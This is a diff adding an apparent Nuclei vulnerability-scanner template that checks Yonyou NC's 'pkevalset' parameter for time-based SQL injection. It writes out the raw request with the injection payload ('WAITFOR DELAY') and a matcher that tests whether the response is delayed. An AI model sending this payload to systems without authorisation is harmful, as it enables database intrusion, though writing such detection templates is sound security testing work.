@@ -1,0 +1,25 @@
+id: yongyouNC-pkevalset-sqli
+
+info:
+  name: yongyouNC-pkevalset-sqli
+  author: yongyouNC
+  severity: high
+
+http:
+- raw:
+  - |-
+    @timeout: 12s
+    GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0
+    Connection: close
+    Accept-Encoding: gzip
+    Content-Type: application/json
+    Content-Length: 121
+
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 5'
+        - 'duration <= 10'  # 限制最大延迟范围，排除网络异常导致的超久延迟
+      condition: and
